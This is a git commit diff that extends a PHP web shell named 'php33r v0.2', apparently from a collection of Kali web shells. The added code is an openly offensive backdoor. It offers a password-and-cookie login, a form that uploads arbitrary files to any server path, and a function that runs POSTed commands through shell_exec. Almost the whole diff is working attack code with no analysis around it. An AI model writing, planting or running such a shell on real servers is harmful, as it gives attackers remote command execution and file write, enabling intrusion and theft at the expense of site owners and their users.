778393e6b41b190362fef98ba4681522529b73f3
Rayferrufino <52383730+Rayferrufino@users.noreply.github.com>
2019-08-14 14:04:45 -0400

    Update FuzziSec-PHP-shell.php

--- Kali web shells/FuzziSec-PHP-shell.php
+++ Kali web shells/FuzziSec-PHP-shell.php
@@ -32,3 +32,61 @@ if (isset($_COOKIE['ph33rCookie'])) {
 <form style="float:right;color:#ffffff;"action="" method="POST" enctype="multipart/form-data">
 <b>Full Remote Path:</b><br />
 <input type="text" name="upload" /> (eg: /tmp/, C:\Users\b33f\Desktop\)<br /><br />
+<b>File Upload:</b><br />
+<input type="submit" value="Upload!"/>
+<input type="file" name="file" />
+</form></fieldset>
+
+<?php 
+   if(isset($_FILES['file'])){
+      $errors= array();
+      $file_name = $_FILES['file']['name'];
+      $file_size =$_FILES['file']['size'];
+      $file_tmp =$_FILES['file']['tmp_name'];
+      $file_type=$_FILES['file']['type'];   
+      $file_ext=strtolower(end(explode('.',$_FILES['file']['name'])));
+               
+      if(empty($errors)==true){
+         move_uploaded_file($file_tmp,$_POST['upload'].$file_name);
+         echo '<pre><span style="font-size: 11px; color: #FFFFFF;">';
+         echo 'Upload: ' . $_FILES['file']['name'] . '<br />';
+         echo 'Size: ' . ($_FILES['file']['size'] / 1024) . ' Kb<br />';
+         echo 'Stored in: ' . $_POST['upload'];
+         echo '</span></pre>';
+      }else{
+         print_r($errors);
+      }
+   }
+   function exec_cmd(){
+      if (isset($_POST['command'])){
+         $exc = $_POST['command']; echo shell_exec($exc);
+      }
+   }
+   echo '<pre><span style="font-size:11px;color:#F2F2F2;">';
+   exec_cmd();
+   echo '</span></pre>';
+?>
+
+<?php
+      exit;
+   } else {
+      echo '<span style="color:#ffffff;opacity: 0.5;">Bad Cookie!</span>'; // Invalid cookie
+      exit;
+   }
+}
+
+// Validate Login
+if (isset($_GET['p']) && $_GET['p'] == 'login') {
+   if (@$_POST['keypass'] == $password) {
+      setcookie('ph33rCookie', md5($_POST['keypass'].$padding), time()+900); // Cookie expiration - 900/60 = 15min
+      header("Location: $_SERVER[PHP_SELF]");
+   } else {
+		// Do nothing, refresh
+   }
+}
+?>
+
+<font style="float:right;" color="#F2F2F2"><b>php33r v0.2</b> - b33f</font>
+<form style="opacity: 0.5;" action='<?php echo $_SERVER["PHP_SELF"]; ?>?p=login' method="post">
+<input type="password" name="keypass" id="keypass" />
+<input type="submit" id="submit" value="Login" />
